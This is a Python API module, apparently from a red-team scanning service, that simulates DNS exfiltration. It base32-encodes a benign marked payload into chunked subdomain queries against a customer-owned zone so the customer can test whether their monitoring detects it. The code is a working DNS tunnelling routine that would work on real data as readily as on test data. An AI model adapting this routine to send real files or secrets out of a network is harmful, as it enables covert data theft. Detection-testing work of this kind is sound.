"""exfil_dns_simulation - chunked DNS-exfil simulation to customer zone
   (playbook §6 #59 Sigma rule coverage / §6 #67 manual detection gap).

Encodes a 4 KB benign string into base32 chunks (each chunk fits in a
DNS label of <=63 bytes) and sends each chunk as a unique subdomain
query against options.exfil_dns_domain (a DNS zone the customer owns).

Customer input via ScanRequest.options:
  - options.exfil_dns_domain   - DNS zone the customer monitoring owns (required)
  - options.exfil_dns_resolver - resolver IP (default 1.1.1.1)
  - options.exfil_payload_size - bytes to exfil (default 4096, max 8192)
  - options.exfil_chunk_max    - max base32 chars per label (default 60, hard cap 63)
  - options.exfil_max_chunks   - safety clamp on labels sent (default 80, hard cap 200)
  - options.exfil_timeout_sec  - overall wall-clock cap (default 60, max 180)

Customer should verify their DNS monitoring caught:
  - Per-host DNS query volume burst (80+ queries to same FQDN in <60s)
  - Long random-looking subdomain labels (base32 entropy)
  - All queries are SRC=scanner-IP, DST=options.exfil_dns_resolver

Detection ASK: customer must confirm queries arrived at their auth NS
or DNS sensor; the scanner cannot see beyond the recursive resolver.

MITRE techniques: T1071.004 (Application Layer Protocol: DNS),
                  T1048.003 (Exfiltration over Unencrypted Protocol),
                  TA0010 (Exfiltration).
"""
from __future__ import annotations
import asyncio
import base64
import os
import secrets
import time
from typing import Optional

from fastapi import APIRouter, Depends

from tools._shared import ScanRequest, verify_scan_quota
from tools._framework import ScanContext, run_scanner
from tools._payloads.exfil_dns_simulation_findings import EXFIL_DNS_SIMULATION_FINDING_RULES

router = APIRouter()
DEFAULT_PAYLOAD_BYTES = 4096
HARD_MAX_PAYLOAD = 8192
DEFAULT_CHUNK = 60
HARD_MAX_CHUNK = 63
DEFAULT_MAX_CHUNKS = 80
HARD_MAX_CHUNKS = 200
DEFAULT_TIMEOUT = 60
HARD_MAX_TIMEOUT = 180


class ExfilDnsSimulationRequest(ScanRequest):
    options: Optional[dict] = None


def _benign_payload(size: int) -> bytes:
    """Generate a deterministic-ish but high-entropy benign string of size bytes.
    We use 'VL-EXFIL-TEST' prefix + secrets so customer can grep for it."""
    prefix = b"VL-EXFIL-TEST|" + str(int(time.time())).encode() + b"|"
    if size <= len(prefix):
        return prefix[:size]
    fill = secrets.token_bytes(size - len(prefix))
    return prefix + fill


def _encode_chunks(payload: bytes, chunk_chars: int) -> list[str]:
    """Base32-encode payload then split into chunks of chunk_chars.
    Base32 is DNS-label-safe (a-z, 2-7 after lower())."""
    b32 = base64.b32encode(payload).decode("ascii").rstrip("=").lower()
    return [b32[i:i + chunk_chars] for i in range(0, len(b32), chunk_chars)]


def _send_dns_query(resolver_ip: str, fqdn: str, timeout: int) -> dict:
    """Send single A-record query for fqdn via resolver_ip. Returns dict with rcode."""
    try:
        import dns.resolver  # type: ignore
        import dns.exception  # type: ignore
        r = dns.resolver.Resolver(configure=False)
        r.nameservers = [resolver_ip]
        r.lifetime = timeout
        r.timeout = timeout
        try:
            r.resolve(fqdn, "A")
            return {"fqdn": fqdn, "ok": True, "rcode": "NOERROR"}
        except dns.resolver.NXDOMAIN:
            # NXDOMAIN is EXPECTED for benign exfil - query still hit the zone NS
            return {"fqdn": fqdn, "ok": True, "rcode": "NXDOMAIN"}
        except dns.resolver.NoAnswer:
            return {"fqdn": fqdn, "ok": True, "rcode": "NOANSWER"}
        except dns.exception.Timeout:
            return {"fqdn": fqdn, "ok": False, "rcode": "TIMEOUT"}
    except Exception as e:
        return {"fqdn": fqdn, "ok": False,
                 "rcode": f"ERR:{type(e).__name__}",
                 "error": str(e)[:140]}


async def gather(ctx: ScanContext):
    opts = ctx.state.get("_options") or {}
    domain = (opts.get("exfil_dns_domain") or "").strip().lstrip(".")
    resolver_ip = (opts.get("exfil_dns_resolver") or "1.1.1.1").strip()

    if not domain:
        ctx.state["exfil_dns_total"] = 0
        ctx.state["exfil_input_missing"] = True
        ctx.source("missing exfil_dns_domain")
        return
    if " " in domain or len(domain) < 4 or "." not in domain:
        ctx.state["exfil_dns_total"] = 0
        ctx.state["exfil_input_invalid"] = "exfil_dns_domain must be a valid FQDN"
        ctx.source("invalid exfil_dns_domain")
        return

    payload_size = min(int(opts.get("exfil_payload_size") or DEFAULT_PAYLOAD_BYTES),
                        HARD_MAX_PAYLOAD)
    chunk_chars = min(int(opts.get("exfil_chunk_max") or DEFAULT_CHUNK),
                       HARD_MAX_CHUNK - 5)  # leave room for sequence prefix
    max_chunks = min(int(opts.get("exfil_max_chunks") or DEFAULT_MAX_CHUNKS),
                      HARD_MAX_CHUNKS)
    overall_to = min(int(opts.get("exfil_timeout_sec") or DEFAULT_TIMEOUT),
                       HARD_MAX_TIMEOUT)
    per_q_to = 4

    session_id = secrets.token_hex(4)  # short prefix so customer can correlate
    payload = _benign_payload(payload_size)
    chunks = _encode_chunks(payload, chunk_chars)
    if len(chunks) > max_chunks:
        chunks = chunks[:max_chunks]

    results: list[dict] = []
    deadline = time.time() + overall_to

    try:
        import dns.resolver  # noqa
    except Exception as e:
        ctx.state["exfil_dns_total"] = 0
        ctx.state["exfil_lib_missing"] = f"dnspython import failed: {e}"
        ctx.source("dnspython missing")
        return

    for idx, chunk in enumerate(chunks, start=1):
        if time.time() >= deadline:
            ctx.state["exfil_deadline_hit"] = True
            break
        # Each FQDN: <chunk>.<seq>.<session>.<domain>
        fqdn = f"{chunk}.{idx:03d}.{session_id}.{domain}"
        # DNS label limit is 63 chars; safety check
        if len(fqdn) > 253:
            results.append({"fqdn": fqdn[:60] + "...", "ok": False,
                             "rcode": "LABEL_TOO_LONG"})
            continue
        res = await asyncio.to_thread(_send_dns_query, resolver_ip, fqdn, per_q_to)
        results.append(res)

    ok_count = sum(1 for r in results if r.get("ok"))
    nx_count = sum(1 for r in results if r.get("rcode") == "NXDOMAIN")
    timeout_count = sum(1 for r in results if r.get("rcode") == "TIMEOUT")

    ctx.state["exfil_dns_session_id"]   = session_id
    ctx.state["exfil_dns_domain"]       = domain
    ctx.state["exfil_dns_resolver"]     = resolver_ip
    ctx.state["exfil_dns_payload_size"] = len(payload)
    ctx.state["exfil_dns_chunk_count"]  = len(chunks)
    ctx.state["exfil_dns_total"]        = len(results)
    ctx.state["exfil_dns_ok"]           = ok_count
    ctx.state["exfil_dns_nxdomain"]     = nx_count
    ctx.state["exfil_dns_timeouts"]     = timeout_count
    ctx.state["exfil_dns_results"]      = results[:80]  # cap intel size
    ctx.state["exfil_dns_chunks_full"]  = [r.get("fqdn", "") for r in results][:80]
    ctx.source(f"exfil DNS sim -> session={session_id}; "
                f"chunks={len(chunks)} sent={ok_count} timeouts={timeout_count} "
                f"via {resolver_ip} -> *.{domain}")


INTEL_FIELDS = [
    ("Session ID",          "exfil_dns_session_id"),
    ("DNS exfil domain",    "exfil_dns_domain"),
    ("Resolver used",       "exfil_dns_resolver"),
    ("Payload bytes",       "exfil_dns_payload_size"),
    ("Chunks generated",    "exfil_dns_chunk_count"),
    ("Queries sent",        "exfil_dns_total"),
    ("Queries successful",  "exfil_dns_ok"),
    ("NXDOMAIN replies",    "exfil_dns_nxdomain"),
    ("Timeouts",            "exfil_dns_timeouts"),
    ("First 80 FQDN list",  "exfil_dns_chunks_full"),
]


@router.post("/api/red_team/exfil_dns_simulation")
async def red_team_exfil_dns_simulation(req: ExfilDnsSimulationRequest,
                                          _=Depends(verify_scan_quota)):
    options = req.options or {}

    async def _gather_with_options(ctx: ScanContext):
        ctx.state["_options"] = options
        await gather(ctx)

    return await run_scanner(
        host=req.target,
        tool="exfil_dns_simulation",
        gather_func=_gather_with_options,
        finding_rules=EXFIL_DNS_SIMULATION_FINDING_RULES,
        intel_fields=INTEL_FIELDS,
        flat_field_keys=[],
    )


def register(app):
    app.include_router(router)
